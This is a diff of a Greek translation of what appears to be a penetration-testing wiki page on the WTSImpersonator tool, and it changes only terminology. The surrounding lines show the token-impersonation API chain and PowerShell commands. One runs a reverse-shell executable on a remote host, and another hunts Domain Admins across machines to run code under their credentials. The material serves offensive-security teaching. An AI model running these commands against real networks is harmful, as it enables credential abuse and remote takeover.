@@ -10,7 +10,7 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 ```
 ### Κύρια Μodule και Χρήση
 
-- **Αναγνώριση Χρηστών**: Η τοπική και απομακρυσμένη αναγνώριση χρηστών είναι δυνατή με το εργαλείο, χρησιμοποιώντας εντολές για κάθε σενάριο:
+- **Καταμέτρηση Χρηστών**: Η τοπική και απομακρυσμένη καταμέτρηση χρηστών είναι δυνατή με το εργαλείο, χρησιμοποιώντας εντολές για κάθε σενάριο:
 
 - Τοπικά:
 ```powershell
@@ -39,7 +39,7 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
-- **Module Αναζήτησης Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα με τα διαπιστευτήριά τους. Αυτό είναι ιδιαίτερα χρήσιμο για την στόχευση Domain Admins με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
+- **Module Εξακρίβωσης Χρηστών**: Στοχεύει συγκεκριμένους χρήστες σε πολλές μηχανές, εκτελώντας κώδικα με τα διαπιστευτήριά τους. Αυτό είναι ιδιαίτερα χρήσιμο για την στόχευση Domain Admins με τοπικά δικαιώματα διαχειριστή σε αρκετά συστήματα.
 - Παράδειγμα χρήσης:
 ```powershell
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
